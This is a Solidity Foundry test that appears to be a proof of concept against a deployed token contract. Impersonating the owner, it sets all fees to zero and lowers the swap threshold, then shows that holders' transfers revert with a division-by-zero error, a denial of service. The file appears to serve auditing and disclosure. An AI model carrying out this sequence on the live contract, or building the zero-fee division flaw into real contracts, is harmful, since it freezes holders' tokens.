pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ISHF {
    function getOwner() external view returns (address);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function setSwapBackSettings(bool _enabled, uint256 _amount) external;
    function setFees_base1000(uint256 _liquidityFee,  uint256 _marketingFee, uint256 _teamFee, uint256 _developmentFee, uint256 _burnFee, uint256 _buybackFee) external;
    function tradingStatus(bool _status) external;
    function totalFee() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9f59E79127fAD40bBC26c1eC6578d345AF40bD1f;
    address attacker = address(this);
    ISHF internal target;
    address internal owner;
    address internal victim = makeAddr("victim");

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = ISHF(TARGET);
        owner = target.getOwner();

        // Give attacker and victim some native currency for gas
        deal(attacker, 10 ether);
        deal(victim, 1 ether);

        // As owner, enable trading and provide the attacker with tokens
        vm.startPrank(owner);
        target.tradingStatus(true);
        target.transfer(attacker, 1_000_000 * 1e9);
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: As owner, configure the contract to create the vulnerability.
        vm.startPrank(owner);

        // Enable swap back and set a minimal threshold.
        target.setSwapBackSettings(true, 1);

        // Set all fees to 0. This sets the `totalFee` to 0, which is the root cause.
        target.setFees_base1000(0, 0, 0, 0, 0, 0);

        vm.stopPrank();

        // Step 2: Seed the contract with tokens to meet the swapThreshold.
        // This ensures the `shouldSwapBack` condition is met on the next transfer.
        target.transfer(address(target), 1);
        assertTrue(target.balanceOf(address(target)) >= 1);

        // Step 3: Fund a victim address to trigger the DoS.
        target.transfer(victim, 1000 * 1e9);

        // Step 4: Trigger the DoS.
        // Any subsequent transfer by a non-exempt user will now revert due to division by zero.
        vm.startPrank(victim);
        vm.expectRevert("SafeMath: division by zero");
        target.transfer(address(0xdead), 1 * 1e9);
        vm.stopPrank();
        assertEq(target.totalFee(), 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

